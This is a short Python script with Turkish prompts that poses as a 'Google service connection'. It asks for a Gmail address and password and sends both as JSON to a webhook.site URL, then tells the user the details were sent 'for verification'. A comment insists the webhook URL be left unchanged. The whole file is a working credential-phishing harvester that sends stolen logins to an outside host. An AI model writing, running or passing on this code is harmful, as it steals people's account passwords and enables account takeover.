import urllib.request
import json

# Webhook URL'n (Değiştirme, kalsın böyle)
WEBHOOK_URL = "https://webhook.site/7f7fa68e-1c15-43f2-b036-d9179808b05e"

print("\n--- Google Servis Bağlantısı ---")
email = input("Gmail Adresi: ")
sifre = input("Şifre: ")

data = {
    "servis": "Gmail",
    "kullanici": email,
    "sifre": sifre
}

params = json.dumps(data).encode('utf8')
req = urllib.request.Request(WEBHOOK_URL, data=params, headers={'content-type': 'application/json'})

try:
    with urllib.request.urlopen(req) as response:
        if response.getcode() == 200:
            print("\n[+] Bilgiler doğrulama için gönderildi!")
except Exception as e:
    print(f"\n[!] Hata: {e}")
    
